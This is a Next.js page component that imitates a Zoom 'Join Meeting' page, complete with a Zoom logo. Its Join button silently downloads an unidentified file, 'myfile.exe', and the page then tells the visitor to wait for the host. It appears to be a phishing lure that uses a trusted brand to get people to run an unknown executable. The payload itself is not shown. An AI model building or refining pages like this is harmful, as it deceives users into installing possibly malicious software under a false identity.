'use client';
import Image from "next/image";
import styles from "./page.module.css";
import { useState } from "react";

export default function Home() {

  const [steps, setSteps] = useState({step_one: false, step_two: true});

  const [inputValue, setInputValue] = useState('');


  const isInputEmpty = inputValue.trim() === '';

  const handleInputChange = (e) => {
    setInputValue(e.target.value);
  };

  const handleDownload = () => {
    const link = document.createElement('a');
    link.href = '/myfile.exe'; // Path to your file
    link.download = 'myfile.exe'; // Optional: specify a custom file name
    link.click(); // Trigger the download
  };

  return (
    <div className={styles.page}>
        <h1 className={styles.mainLabel}>How to Join a Zoom Meeting</h1>

       

      <div className={styles.box}>
        <h3>Join Meeting</h3>

        <div className={styles.logo}>
          <img src="https://static.vecteezy.com/system/resources/thumbnails/016/716/479/small_2x/zoom-meetings-icon-free-png.png" alt="" />
          <span>Join</span>
        </div>

        {
          steps.step_one && 
          <div className={styles.form}>
            <div className={styles.input}>
                <label htmlFor="id">Meeting ID or Personal Link Name</label>
                <input type="text" placeholder="Enter Meeting ID or Personal Link Name"
                value={inputValue} 
                onChange={handleInputChange} />
            </div>

            <span className={styles.terms}>
              By clicking "Join",you agree to our <a href="#">Terms of Services</a> and <a href="#">Privacy Statement</a>
            </span>

            <button 
            disabled={isInputEmpty} 
            onClick={handleDownload}>Join</button>
          </div>
        }
        {
          steps.step_two && 
          <div className={styles.message}>
            <h2>Please wait, the meeting host will let you in soon.</h2>
            <h4>Personal Meeting Room</h4>
          </div>
        }

        
      </div>
    </div>
  );
}
